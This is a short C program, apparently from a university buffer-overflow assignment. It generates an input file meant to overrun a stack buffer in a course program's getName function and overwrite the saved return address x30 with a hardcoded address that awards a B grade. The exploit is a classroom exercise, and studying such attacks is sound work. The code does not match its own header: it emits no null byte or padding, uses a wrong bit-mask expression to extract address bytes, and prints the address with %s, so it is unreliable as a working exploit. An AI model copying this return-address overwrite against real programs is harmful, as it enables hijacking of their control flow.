/*--------------------------------------------------------------------*/
/* createdataB.c
/* Author: Praneeth Bhandaru
/*
/* Produces a file called dataB with the student name, a nullbyte,
/* padding to overrun the stack, and the address of the instruction in
/* main to get a B, the latter of which will overwrite getName's stored
/* x30.
/*--------------------------------------------------------------------*/


#include <stdio.h>
#include <stdlib.h>

const static unsigned long lReturnAddress = 0x400890;

int main(int argc, char *argv[]) {
    char *pcName;
    char *pcAddress;
    int i;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <name>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    pcName = argv[1];
    pcAddress = calloc(sizeof(lReturnAddress) + 1, sizeof(char));
    for (i = 0; i < sizeof(unsigned long); i++) {
        pcAddress[i] = (lReturnAddress & (0x6F << (i * 3))) ;
    }

    printf("%s", pcName);
    printf("%s", pcAddress);

    return 0;
}
